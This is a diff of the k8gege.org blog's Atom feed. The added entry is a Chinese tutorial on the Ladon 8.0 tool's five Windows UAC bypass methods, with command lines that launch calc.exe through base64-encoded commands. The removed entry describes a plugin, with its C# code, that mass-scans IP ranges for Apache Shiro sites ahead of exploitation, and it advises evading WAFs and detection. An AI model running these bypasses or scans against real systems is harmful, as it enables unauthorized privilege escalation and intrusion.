@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2021-02-03T16:29:56.983Z</updated>
+  <updated>2021-02-06T10:47:17.057Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖提权〗Ladon 8.0五种方法BypaaUAC(Win7-Win10)</title>
+    <link href="http://k8gege.org/p/Ladon_bypassUAC.html"/>
+    <id>http://k8gege.org/p/Ladon_bypassUAC.html</id>
+    <published>2021-02-06T10:10:00.000Z</published>
+    <updated>2021-02-06T10:47:17.057Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h3><p>根据MSDN中的文档,User Account Control(UAC)是在Windows Vista 以后版本中引入的一种安全机制,针对具有有限权限的账户.</p><p>通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><h3 id="BypassUAC方法"><a href="#BypassUAC方法" class="headerlink" title="BypassUAC方法"></a>BypassUAC方法</h3><p>目前公开的绕过UAC的几种方式:</p><p>1.各类的UAC白名单程序的DLL劫持<br>2.各类自动提升权限的COM接口利用(Elevated COM interface)<br>3.Windows 自身漏洞提权<br>4.远程注入</p><p>UACME: <a href="https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法，有兴趣可自行研究" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法，有兴趣可自行研究</a></p><h3 id="利用白名单"><a href="#利用白名单" class="headerlink" title="利用白名单"></a>利用白名单</h3><p>上文也已经分析了,如果进程本身具有管理员权限或者可以直接获取管理员权限的话,就不会弹出UAC框让用户确认,这类程序被称为白名单程序，例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe，rundll32.exe，explorer.exe等等。</p><h3 id="Ladon-8-0"><a href="#Ladon-8-0" class="headerlink" title="Ladon 8.0"></a>Ladon 8.0</h3><p>[+] BypassUac 五种方法UAC提权（非交互式执行Base64加密CMD命令）<br>用法Ladon BypassUac</p><p>eventvwr<br>fodhelper<br>computerdefaults<br>sdclt<br>slui</p><p>[+] BypassUac2 eventvwr方法执行明文cmd命令（即8.0前的bypassUAC）</p><h3 id="Ladon用法"><a href="#Ladon用法" class="headerlink" title="Ladon用法"></a>Ladon用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Load BypassUAC</span><br><span class="line">Usage:</span><br><span class="line">Method: eventvwr, fodhelper,computerdefaults, sdclt, slui</span><br><span class="line">Default Bypass Method is eventvwr</span><br><span class="line">Ladon BypassUAC Method Base64Cmd</span><br><span class="line">Example:</span><br><span class="line">Ladon BypassUAC eventvwr Y2FsYw==</span><br></pre></td></tr></table></figure><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>Example usage for eventvwr bypass to launch calc.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure><p>Example usage for fodhelper bypass to launch calc.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure><p>Example usage for computerdefaults bypass to launch calc.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure><p>Example usage for sdclt bypass to launch calc.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure><p>Note: this appears to only work on Windows 10 in my testing</p><p>Example usage for slui bypass to launch calc.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl</span><br></pre></td></tr></table></figure><p>Example usage for DiskCleanup bypass to launch calc.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==</span><br></pre></td></tr></table></figure><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo3.4: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>Ladon 7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>Ladon 8.0版本：K8小密圈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;什么是UAC&quot;&gt;&lt;a href=&quot;#什么是UAC&quot; class=&quot;headerlink&quot; title=&quot;什么是UAC&quot;&gt;&lt;/a&gt;什么是UAC&lt;/h3&gt;&lt;p&gt;根据MSDN中的文档,User Account Control(UAC)是在Windows Vista 以后
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="bypassUAC" scheme="http://k8gege.org/tags/bypassUAC/"/>
+    
+  </entry>
   
   <entry>
     <title>〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码</title>
@@ -546,41 +574,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
       <category term="CVE-2020-0688" scheme="http://k8gege.org/tags/CVE-2020-0688/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon插件-批量检测网站是否使用Shiro</title>
-    <link href="http://k8gege.org/p/IsShiro.html"/>
-    <id>http://k8gege.org/p/IsShiro.html</id>
-    <published>2020-09-13T04:40:00.000Z</published>
-    <updated>2020-09-13T05:24:23.000Z</updated>
-    
-    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span>%></%></p><h1 id="本文教大家如何用编写Ladon插件，并批量检测网站是否使用Shiro。"><a href="#本文教大家如何用编写Ladon插件，并批量检测网站是否使用Shiro。" class="headerlink" title="本文教大家如何用编写Ladon插件，并批量检测网站是否使用Shiro。"></a>本文教大家如何用编写Ladon插件，并批量检测网站是否使用Shiro。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/IsShiro.html";</script><p>为何不直接批量检测是否存在反序列化漏洞？由于检测Shiro是否存在反序列化漏洞，可能需要发送多个KEY去检测，意味着要发比较多的包，对于批量来说可能速度会很慢，所以我们改变策略，只发两三个包先把使用Shiro的网站找出来，找出来之后再使用对应工具扫描目标站点。要知道批量发送PAYLOAD和批量发送正常请求对于WAF来说会有不同的结果，前者WAF不会拦截，后者可能就轻易被BAN掉IP。缺点不只是速度慢，还有被发现的风险。当然大家也可加上检测序列化漏洞的代码，一键批量，毕竟大家遇到的环境不同，管理员的水平也不同，有些你扫到目标机器冒烟了管理员都不理你，这种水平的管理员，你怎么搞都不会被发现啦。</p><h3 id="支持版本"><a href="#支持版本" class="headerlink" title="支持版本"></a>支持版本</h3><p>&gt;= Ladon 5.0</p><h3 id="模块类型"><a href="#模块类型" class="headerlink" title="模块类型"></a>模块类型</h3><p>信息收集</p><h3 id="插件功能"><a href="#插件功能" class="headerlink" title="插件功能"></a>插件功能</h3><p>检测指定网站是否使用Apache Shiro，工具可单独使用，也可被Ladon调用批量检测。</p><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><p>判断是否使用Shiro,通过检测返回头是否包含rememberMe即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">private static void CheckShiro(string url)</span><br><span class="line"> &#123;</span><br><span class="line">     try</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">         HttpWebRequest request &#x3D; (HttpWebRequest)HttpWebRequest.Create(url);</span><br><span class="line">         request.Headers.Add(&quot;Cookie&quot;, &quot;rememberMe&#x3D;0&quot;);</span><br><span class="line">         HttpWebResponse response &#x3D; (HttpWebResponse)request.GetResponse();</span><br><span class="line"></span><br><span class="line">         &#x2F;&#x2F;Console.WriteLine(String.Format(&quot;&#123;0,-20&#125;HTTP&#x2F;&#123;1&#125; &#123;2:d&#125; &#123;3&#125;&quot;, &quot;(Status-Line)&quot;, response.ProtocolVersion, response.StatusCode, response.StatusDescription));</span><br><span class="line"></span><br><span class="line">         for (int i &#x3D; 0; i &lt; response.Headers.Keys.Count; i++)</span><br><span class="line">         &#123;</span><br><span class="line">             &#x2F;&#x2F;Console.WriteLine(String.Format(&quot;&#123;0,-20&#125;&#123;1&#125;&quot;, response.Headers.Keys[i], response.Headers.Get(i)));</span><br><span class="line">             if (response.Headers.Get(i).Contains(&quot;rememberMe&#x3D;&quot;))</span><br><span class="line">                 Console.WriteLine(url + &quot; IsShiro&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     catch (Exception ex)</span><br><span class="line">     &#123;</span><br><span class="line">         &#x2F;&#x2F;Console.WriteLine(ex.ToString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="参数代码"><a href="#参数代码" class="headerlink" title="参数代码"></a>参数代码</h3><p>1.支持指定URL<br>2.支持IP参数（主要让Ladon批量扫描IP段进行更全的检测）</p><p>代码说明：<br>当参数包含HTTP时为检测已知URL，为IP时检测常见的80、443、8080端口，特别是批量C段、B段等时，都已经做到C段或B段了，你的目的肯定是为了获取更多更全的信息拓展目标，当然你也可以加入目标已知的喜欢用的WEB端口，比如8081、8089、8000等，具体根据你的项目来修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">string url &#x3D; args[0];</span><br><span class="line">if (url.ToLower().Contains(&quot;http&quot;))</span><br><span class="line">CheckShiro(url);</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + args[0];</span><br><span class="line">CheckShiro(url);</span><br><span class="line">url &#x3D; &quot;https:&#x2F;&#x2F;&quot; + args[0];</span><br><span class="line">CheckShiro(url);</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + args[0]+&quot;:8080&quot;;</span><br><span class="line">CheckShiro(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插件用法"><a href="#插件用法" class="headerlink" title="插件用法"></a>插件用法</h3><h4 id="工具用法"><a href="#工具用法" class="headerlink" title="工具用法"></a>工具用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IsShiro.exe http://192.169.1.8</span><br><span class="line">IsShiro.exe 192.169.1.8</span><br></pre></td></tr></table></figure><h4 id="Ladon用法"><a href="#Ladon用法" class="headerlink" title="Ladon用法"></a>Ladon用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage</span><br><span class="line">Ladon target *.exe</span><br><span class="line">Example:</span><br><span class="line">Ladon http://192.169.1.8 IsShiro.exe</span><br><span class="line">Ladon 192.169.1.8 IsShiro.exe</span><br><span class="line">Ladon 192.169.1.8/24 IsShiro.exe</span><br><span class="line">Ladon 192.169.1.8/16 IsShiro.exe</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/moudle/IsShiro.PNG"></p><h4 id="批量URL"><a href="#批量URL" class="headerlink" title="批量URL"></a>批量URL</h4><p>目录下放url.txt，里面放入已知url即可,非同段IP的批量同理<br><a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a><br><a href="http://10.23.4.56:800" target="_blank" rel="noopener">http://10.23.4.56:800</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon IsShiro.exe</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>插件源码：小密圈可下载</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p style=&quot;color:#fff;&quot;&gt; 
-&lt;% &lt;span class=&quot;archive-article-date&quot;&gt;
-Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
-
-%&gt;
-&lt;/%&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;本文教大家如
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="信息收集" scheme="http://k8gege.org/tags/Discover/"/>
-    
-      <category term="CMS" scheme="http://k8gege.org/tags/CMS/"/>
     
   </entry>
   
